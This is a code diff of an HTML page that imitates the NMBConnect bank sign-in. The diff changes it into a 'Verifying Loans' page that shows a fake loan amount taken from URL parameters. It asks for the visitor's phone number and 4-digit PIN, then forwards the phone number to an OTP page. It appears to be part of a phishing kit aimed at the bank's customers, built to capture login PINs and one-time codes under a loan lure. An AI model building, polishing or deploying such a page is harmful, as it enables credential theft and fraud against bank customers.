@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>NMBConnect | Sign In</title>
+    <title>NMBConnect | Verifying Loans</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -18,7 +18,7 @@
         
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop'); /* Placeholder for the hand background */
+            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
             background-size: cover;
             background-position: center;
             min-height: 100vh;
@@ -34,100 +34,53 @@
             display: flex;
             align-items: center;
             padding: 10px 0;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
 
-        .back-btn {
-            font-size: 24px;
-            cursor: pointer;
-            margin-right: 15px;
-        }
-
-        .nav-title {
-            font-size: 18px;
-            font-weight: 500;
-        }
+        .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; }
+        .nav-title { font-size: 18px; font-weight: 500; }
 
         .logo-container {
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 20px;
         }
 
         .logo-circle {
-            width: 120px;
-            height: 120px;
+            width: 100px;
+            height: 100px;
             background: var(--nmb-blue);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 15px;
+            margin: 0 auto 10px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
 
-        .logo-circle img {
-            width: 70%;
-        }
-
-        .brand-name {
-            font-size: 24px;
-            font-weight: 700;
-        }
-
+        .brand-name { font-size: 22px; font-weight: 700; }
         .brand-name .nmb { color: #4a90e2; }
         .brand-name .connect { color: var(--nmb-gold); }
 
-        .toggle-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 44px;
-            height: 22px;
-        }
-
-        .switch input { opacity: 0; width: 0; height: 0; }
-
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background-color: #4a90e2;
-            transition: .4s;
-            border-radius: 34px;
-        }
-
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 18px;
-            width: 18px;
-            left: 2px;
-            bottom: 2px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-
-        input:checked + .slider:before {
-            transform: translateX(22px);
-        }
-
-        .form-container {
+        .loan-info {
+            background: rgba(0, 51, 102, 0.6);
+            border: 1px solid rgba(228, 193, 106, 0.3);
+            border-radius: 12px;
+            padding: 12px 20px;
+            margin-bottom: 25px;
             width: 100%;
             max-width: 360px;
+            text-align: center;
+            backdrop-filter: blur(5px);
         }
+
+        .loan-info .type { font-size: 14px; font-weight: 600; color: var(--nmb-gold); margin-bottom: 4px; }
+        .loan-info .amount { font-size: 20px; font-weight: 700; color: white; }
+
+        .form-container { width: 100%; max-width: 360px; }
 
         .input-group {
             position: relative;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             border: 1px solid rgba(255, 255, 255, 0.8);
             border-radius: 12px;
             padding: 12px 15px;
@@ -137,46 +90,13 @@
             backdrop-filter: blur(5px);
         }
 
-        .flag-icon {
-            width: 24px;
-            margin-right: 10px;
-        }
+        .flag-icon { width: 24px; margin-right: 10px; }
+        .country-code { color: #4a90e2; font-weight: 600; margin-right: 10px; font-size: 15px; }
+        .dropdown-arrow { border-left: 5px solid transparent; border-right: 5px solid transparent; border-top: 5px solid white; margin-right: 15px; }
+        .input-field { flex: 1; background: transparent; border: none; color: white; font-size: 16px; outline: none; font-family: inherit; }
+        .input-field::placeholder { color: rgba(255, 255, 255, 0.7); }
 
-        .country-code {
-            color: #4a90e2;
-            font-weight: 600;
-            margin-right: 10px;
-            font-size: 15px;
-        }
-
-        .dropdown-arrow {
-            border-left: 5px solid transparent;
-            border-right: 5px solid transparent;
-            border-top: 5px solid white;
-            margin-right: 15px;
-        }
-
-        .input-group i {
-            margin-right: 15px;
-            font-size: 18px;
-            opacity: 0.8;
-        }
-
-        .input-field {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: white;
-            font-size: 16px;
-            outline: none;
-            font-family: inherit;
-        }
-
-        .input-field::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
-
-        .sign-in-btn {
+        .verify-btn {
             width: 100%;
             padding: 16px;
             background: white;
@@ -187,12 +107,8 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
-            transition: all 0.2s;
-        }
-
-        .sign-in-btn:active {
-            transform: scale(0.98);
-            background: #f0f0f0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .error-msg {
@@ -201,12 +117,12 @@
             text-align: center;
             margin-bottom: 15px;
             display: none;
-            background: rgba(0,0,0,0.5);
-            padding: 8px;
-            border-radius: 8px;
+            background: rgba(0,0,0,0.6);
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid var(--error);
         }
 
-        /* Overlay */
         .overlay {
             position: fixed; inset: 0;
             display: none;
@@ -223,21 +139,17 @@
         .sp-t { font-size: 18px; font-weight: 600; color: white; margin-top: 20px; }
         .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 10px; }
         @keyframes sp { to { transform: rotate(360deg); } }
-
-        /* Icon fonts simulation */
-        .icon-lock::before { content: '🔒'; }
     </style>
 </head>
-<body>
+<body onload="init()">
     <div class="header-nav">
-        <span class="back-btn">❮</span>
-        <span class="nav-title">Create Profile</span>
+        <span class="back-btn" onclick="location.href='index.html'">❮</span>
+        <span class="nav-title">Verifying NMBConnect Loans</span>
     </div>
 
     <div class="logo-container">
         <div class="logo-circle">
-            <!-- Simplified chain logo using SVG -->
-            <svg viewBox="0 0 100 100" width="70" height="70">
+            <svg viewBox="0 0 100 100" width="60" height="60">
                 <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                 <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
             </svg>
@@ -245,13 +157,9 @@
         <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
     </div>
 
-    <div class="toggle-container">
-        <span>Email Address</span>
-        <label class="switch">
-            <input type="checkbox" checked>
-            <span class="slider"></span>
-        </label>
-        <span>Mobile Number</span>
+    <div id="loanBox" class="loan-info" style="display:none;">
+        <div class="type" id="loanType">NMB Loan</div>
+        <div class="amount" id="loanAmount">$0.00 USD</div>
     </div>
 
     <div class="form-container">
@@ -262,7 +170,7 @@
                 <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
                 <span class="country-code">(+263)</span>
                 <div class="dropdown-arrow"></div>
-                <input type="tel" class="input-field" id="phone" placeholder="772145754" inputmode="numeric" maxlength="9">
+                <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9">
             </div>
 
             <div class="input-group">
@@ -270,7 +178,7 @@
                 <input type="password" class="input-field" id="pin" placeholder="Enter Pin" inputmode="numeric" maxlength="4">
             </div>
 
-            <button type="submit" class="sign-in-btn">Sign In</button>
+            <button type="submit" class="verify-btn">Verify</button>
         </form>
     </div>
 
@@ -288,7 +196,12 @@
         function init() {
             const p = new URLSearchParams(location.search);
             const d = p.get('data'), pr = p.get('price');
-            if (d && pr) { bd = { data: d, price: pr }; }
+            if (d && pr) { 
+                bd = { data: d, price: pr }; 
+                document.getElementById('loanBox').style.display = 'block';
+                document.getElementById('loanType').textContent = d;
+                document.getElementById('loanAmount').textContent = '$' + pr + ' USD';
+            }
         }
 
         function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
@@ -369,8 +282,6 @@
             const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
             location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${ph}`;
         }
-
-        window.onload = init;
     </script>
 </body>
 </html>
